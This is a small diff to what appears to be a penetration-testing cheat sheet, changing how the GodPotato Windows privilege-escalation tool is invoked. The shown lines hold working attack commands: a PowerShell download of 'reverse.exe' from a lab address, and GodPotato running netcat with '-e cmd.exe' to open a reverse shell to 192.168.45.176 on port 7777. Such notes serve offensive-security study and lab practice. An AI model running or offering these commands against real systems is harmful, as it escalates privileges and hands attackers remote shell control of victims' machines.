@@ -1145,8 +1145,8 @@ iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe
 
 ### Windows Privesc: God Potato(https://github.com/BeichenDream/GodPotato)
 ```bash
-GodPotato -cmd "cmd /c whoami"
-GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
+.\GodPotato.exe -cmd "cmd /c whoami"
+.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
 ```
 
 ### Windows Privesc: Insecure Service Permissions
